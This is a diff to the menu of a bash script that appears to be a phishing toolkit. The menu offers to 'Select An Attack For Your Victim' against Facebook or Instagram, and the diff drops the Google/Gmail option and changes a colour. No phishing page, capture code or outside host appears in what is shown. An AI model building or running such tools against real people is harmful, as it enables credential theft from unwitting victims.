@@ -568,12 +568,11 @@ site_gmail() {
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${RED}[${GREEN}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
+		${RED}[${GREEN}::${RED}]${GREEN} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
 
 		${RED}[${GREEN}01${RED}]${GREEN} Facebook      
-		${RED}[${GREEN}02${RED}]${GREEN} Instagram     
-		${RED}[${GREEN}03${RED}]${GREEN} Google      
-		${RED}[${GREEN}04${RED}]${GREEN} About         ${RED}[${GREEN}00${RED}]${ORANGE} Exit
+		${RED}[${GREEN}02${RED}]${GREEN} Instagram       
+		${RED}[${GREEN}03${RED}]${GREEN} About         ${RED}[${GREEN}00${RED}]${ORANGE} Exit
 
 	EOF
 	
@@ -585,7 +584,7 @@ main_menu() {
 		2 | 02)
 			site_instagram;;
 		3 | 03)
-			site_gmail;;
+			about;;
 		4 | 04)
 			about;;
 		0 | 00 )
